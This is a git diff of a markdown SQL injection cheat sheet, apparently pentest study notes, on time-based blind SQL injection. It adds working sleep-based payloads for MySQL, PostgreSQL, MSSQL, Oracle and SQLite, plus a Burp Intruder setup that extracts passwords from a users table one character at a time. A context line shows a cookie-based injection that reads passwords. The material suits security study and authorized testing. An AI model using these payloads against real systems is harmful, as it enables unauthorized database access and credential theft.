@@ -203,15 +203,35 @@ Cookie: TrackingId=xyz'	AND 1=(SELECT CASE WHEN (SUBSTR((SELECT password FROM us
 
 * Condition: As SQL queries are normally processed synchronously by the application, delaying the execution of a SQL query also delays the HTTP response.
 * Triggering time delays depending on whether an injected condition is true or false
-
-```
-'; IF (1=2) WAITFOR DELAY '0:0:10'--
-'; IF (1=1) WAITFOR DELAY '0:0:10'--
-```
-
-* The first does not trigger a delay (false), the second does (true)
 * We can retrieve data by testing one character at a time
-* `'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`
+
+```sql
+# MySQL
+AND (SELECT 1337 FROM (SELECT(SLEEP(10-(IF((1=1),0,10))))) RANDSTR)
+# PostgreSQL
+AND 1337=(CASE WHEN (1=1) THEN (SELECT 1337 FROM PG_SLEEP(10)) ELSE 1337 END)
+# MSSQL
+AND 1337=(CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 1337 END)
+# Oracle
+AND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) ELSE 1337 END)
+# SQLite
+AND 1337=(CASE WHEN (1=1) THEN (SELECT 1337 FROM (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))))) ELSE 1337 END)
+```
+
+<details>
+
+<summary>Attack example + automation with burp (PostgreSQL)</summary>
+
+* Attack type: cluser bomb
+* Payload position: (substring position) `§1§` , (char to match)`§a§`
+* `LIMIT 1` if you want the first row. Otherwise use `LIMIT 1 OFFSET 4`
+* Create new resource pool with maximum concurrent request to 1
+
+```sql
+param=' AND 1337=(CASE WHEN ( (select substring(password,§1§,1) from users LIMIT 1 ) = '§a§' ) THEN (SELECT 1337 FROM PG_SLEEP(5)) ELSE 1337 END)--
+```
+
+</details>
 
 ### <mark style="color:yellow;">Out-Of-Band (OAST) SQL injection</mark>
 
